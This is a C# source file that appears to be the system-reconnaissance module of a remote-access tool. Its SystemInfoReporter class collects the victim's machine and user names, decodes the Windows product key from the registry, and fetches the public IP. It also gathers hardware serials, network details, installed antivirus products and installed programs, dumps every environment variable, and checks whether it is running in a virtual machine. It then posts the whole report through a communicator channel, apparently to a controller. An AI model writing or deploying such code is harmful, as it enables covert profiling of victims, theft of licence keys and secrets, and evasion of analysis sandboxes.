using Microsoft.Win32;
using System;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using True.Core;

namespace True.Features
{
    public static class SystemInfoReporter
    {
        public static async Task SendSystemInfo()
        {
            var info = await GetSystemInfoString();
            await Communicator.PostResponse("sysinfo", info);
        }

        public static async Task<string> GetSystemInfoString()
        {

            var sb = new StringBuilder();

            Logger.Info("SystemInfo", "Sending system info...");
            try
            {

                sb.AppendLine($"Machine Name: {Environment.MachineName}");
                sb.AppendLine($"Username: {Environment.UserName}");
                sb.AppendLine($"Domain: {Environment.UserDomainName}");
                sb.AppendLine($"64-bit OS: {Environment.Is64BitOperatingSystem}");
                sb.AppendLine($"Architecture: {RuntimeInformation.OSArchitecture}");
                sb.AppendLine($"Uptime: {TimeSpan.FromMilliseconds(Environment.TickCount64)}");
                sb.AppendLine($"Language: {CultureInfo.InstalledUICulture.DisplayName} ({CultureInfo.InstalledUICulture.Name})");
                sb.AppendLine($"System Language: {CultureInfo.CurrentCulture.DisplayName}");
                sb.AppendLine($"Time Zone: {TimeZoneInfo.Local.DisplayName}");
                sb.AppendLine($"Windows Product Key: {GetWindowsProductKey()}");

                sb.AppendLine();

                // --- OS Info ---
                sb.AppendLine("== OS Info ==");
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject os in searcher.Get())
                    {
                        sb.AppendLine($"OS: {os["Caption"]} {os["Version"]} ({os["BuildNumber"]})");
                        sb.AppendLine($"Install Date: {ManagementDateTimeConverter.ToDateTime(os["InstallDate"].ToString())}");
                    }
                }

                // Windows Activation Status

                using (var searcher = new ManagementObjectSearcher("SELECT LicenseStatus FROM SoftwareLicensingProduct WHERE PartialProductKey IS NOT NULL"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        int status = Convert.ToInt32(obj["LicenseStatus"]);
                        string readable = status switch
                        {
                            0 => "Unlicensed",
                            1 => "Licensed",
                            2 => "OOB Grace",
                            3 => "OOT Grace",
                            4 => "NonGenuine Grace",
                            5 => "Notification",
                            6 => "Extended Grace",
                            _ => "Unknown"
                        };
                        sb.AppendLine($"License Status: {readable}");
                        break; // only need first
                    }
                }



                // Total RAM
                sb.AppendLine("\n== System RAM ====");
                using (var searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        long bytes = Convert.ToInt64(obj["TotalPhysicalMemory"]);
                        sb.AppendLine($"Total RAM: {bytes / 1024 / 1024 / 1024} GB");
                    }
                }


                // DotNet Versions

                sb.AppendLine("\n== .NET Versions ==");
                var ndpKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\NET Framework Setup\NDP\");
                foreach (var versionKey in ndpKey.GetSubKeyNames())
                {
                    if (!versionKey.StartsWith("v")) continue;
                    var subKey = ndpKey.OpenSubKey(versionKey);
                    string name = subKey?.GetValue("Version", "") as string;
                    if (!string.IsNullOrWhiteSpace(name))
                        sb.AppendLine($"  {versionKey} - {name}");
                }

                // Public IP Address

                try
                {
                    sb.AppendLine("\n== Public IP Address ========");
                    using var client = new HttpClient();
                    var ip = await client.GetStringAsync("https://api.ipify.org");
                    sb.AppendLine($"Public IP: {ip.Trim()}");
                }
                catch { sb.AppendLine("Public IP: [Error]"); }



                // Screen Resolution
                sb.AppendLine("\n== Screen Resolution ==");
                var screen = Screen.PrimaryScreen.Bounds;
                sb.AppendLine($"Screen: {screen.Width} x {screen.Height}");


                // Edition from registry
                sb.AppendLine("\n== Windows Edition ==");
                sb.AppendLine($"Edition: {Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "EditionID", "")}");
                sb.AppendLine();

                // CPU Name
                sb.AppendLine("\n== CPU NAME ==");
                using (var searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor"))
                {
                    foreach (var obj in searcher.Get())
                        sb.AppendLine($"CPU: {obj["Name"]}");
                        sb.AppendLine($"Logical Processors: {Environment.ProcessorCount}");
                }


                // --- GPU Info ---
                sb.AppendLine("\n== GPU Info ==");
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                        sb.AppendLine($"GPU: {obj["Name"]} ({obj["AdapterRAM"]} bytes RAM)");
                }

                // --- Motherboard Info ---
                sb.AppendLine("\n== Motherboard Info ==");
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                        sb.AppendLine($"Model: {obj["Product"]} | Vendor: {obj["Manufacturer"]} | Serial: {obj["SerialNumber"]}");
                }

                // --- BIOS Info ---
                sb.AppendLine("\n== BIOS Info ==");
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                        sb.AppendLine($"BIOS: {obj["SMBIOSBIOSVersion"]} | Date: {obj["ReleaseDate"]}");
                }

                // ---- Battery Status
                sb.AppendLine("\n== Battery Status ==");

                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Battery"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        sb.AppendLine($"Battery Status: {obj["BatteryStatus"]} | Charge: {obj["EstimatedChargeRemaining"]}%");
                    }
                }


                // --- Temp Folder ---
                sb.AppendLine("\n== Temp Folder ==");
                sb.AppendLine($"Temp Folder: {Path.GetTempPath()}");

                // --- Drive Info ---
                sb.AppendLine("\n== Drive Info ==");
                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (!drive.IsReady) continue;
                    sb.AppendLine($"Drive {drive.Name} - {drive.DriveFormat} - {drive.DriveType} - Free: {Math.Round((double)drive.AvailableFreeSpace / 1024 / 1024 / 1024, 1)} GB / Total: {drive.TotalSize / 1_000_000_000} GB");
                }

                // --- Network Info ---
                sb.AppendLine("\n== Network Interfaces ==");
                foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    var props = ni.GetIPProperties();
                    sb.AppendLine($"Interface: {ni.Name} - {ni.NetworkInterfaceType} - MAC Address: {ni.GetPhysicalAddress()}");

                    foreach (var ip in props.UnicastAddresses)
                        sb.AppendLine($"  IP Address: {ip.Address}");
                }

                sb.AppendLine("\n== Network Interfaces ==");

                foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Loopback || ni.OperationalStatus != OperationalStatus.Up)
                        continue;

                    string mac = string.Join(":", ni.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2")));
                    var props = ni.GetIPProperties();

                    sb.AppendLine($"Interface: {ni.Name}");
                    sb.AppendLine($"  Type: {ni.NetworkInterfaceType}");
                    sb.AppendLine($"  Status: {ni.OperationalStatus}");
                    sb.AppendLine($"  MAC: {mac}");
                    sb.AppendLine($"  Speed: {ni.Speed / 1_000_000} Mbps");

                    foreach (var ip in props.UnicastAddresses)
                        sb.AppendLine($"  IP: {ip.Address}");

                    foreach (var gw in props.GatewayAddresses)
                        sb.AppendLine($"  Gateway: {gw.Address}");

                    foreach (var dns in props.DnsAddresses)
                        sb.AppendLine($"  DNS: {dns}");
                }


                // --- Defender / AV Info ---
                sb.AppendLine("\n== Antivirus Info ==");
                try
                {
                    using (var searcher = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct"))
                    {
                        foreach (ManagementObject av in searcher.Get())
                        {
                            sb.AppendLine($"AV: {av["displayName"]}");
                            sb.AppendLine($"  Path: {av["pathToSignedProductExe"]}");
                            sb.AppendLine($"  State: {av["productState"]}");
                        }
                    }
                }
                catch (Exception e)
                {
                    sb.AppendLine($"AV Info Error: {e.Message}");
                }

                // --- VM Detection ---
                sb.AppendLine("\n== VM Detection ==");
                string[] vmIndicators = { "VMware", "VirtualBox", "Xen", "KVM", "QEMU", "Hyper-V" };
                string systemManufacturer = "";
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject mo in searcher.Get())
                        systemManufacturer = mo["Manufacturer"].ToString();
                }
                bool isVM = vmIndicators.Any(vm => systemManufacturer.IndexOf(vm, StringComparison.OrdinalIgnoreCase) >= 0);
                sb.AppendLine($"Manufacturer: {systemManufacturer} => {(isVM ? "VM Detected" : "Bare Metal")}");


                // ---- Environment Variables ----
                sb.AppendLine("\n== Environment Variables ==");
                var envVars = Environment.GetEnvironmentVariables();
                foreach (var key in envVars.Keys)
                {
                    sb.AppendLine($"{key} = {envVars[key]}");
                }



                // --- Installed Programs ---
                sb.AppendLine("\n== Installed Programs ==");
                var keys = new[]
                {
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
                };

                foreach (string root in keys)
                {
                    using (var key = Registry.LocalMachine.OpenSubKey(root))
                    {
                        if (key == null) continue;
                        foreach (var subName in key.GetSubKeyNames())
                        {
                            using (var sub = key.OpenSubKey(subName))
                            {
                                var name = sub?.GetValue("DisplayName") as string;
                                if (!string.IsNullOrWhiteSpace(name))
                                    sb.AppendLine($"  {name}");
                            }
                        }
                    }
                }

            }
            catch (Exception ex)
            {
                Logger.Error("SystemInfo", ex.ToString());
            }
            //await Task.CompletedTask;
            return sb.ToString();
        }


        private static string GetWindowsProductKey()
        {
            try
            {
                using var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", false);
                byte[] digitalProductId = key?.GetValue("DigitalProductId") as byte[];
                if (digitalProductId == null || digitalProductId.Length < 67) return "N/A";

                const string keyChars = "BCDFGHJKMPQRTVWXY2346789";
                var keyOutput = new char[25];
                int keyStartIndex = 52;
                int isWin8OrLater = (digitalProductId[66] / 6) & 1;
                digitalProductId[66] = (byte)((digitalProductId[66] & 0xF7) | ((isWin8OrLater & 2) * 4));

                for (int i = 24; i >= 0; i--)
                {
                    int current = 0;
                    for (int j = 14; j >= 0; j--)
                    {
                        current = current * 256 ^ digitalProductId[j + keyStartIndex];
                        digitalProductId[j + keyStartIndex] = (byte)(current / 24);
                        current %= 24;
                    }
                    keyOutput[i] = keyChars[current];
                }

                var keyString = new string(keyOutput);
                return string.Join("-", Enumerable.Range(0, 5).Select(i => keyString.Substring(i * 5, 5)));
            }
            catch
            {
                return "Error";
            }
        }

    }
}
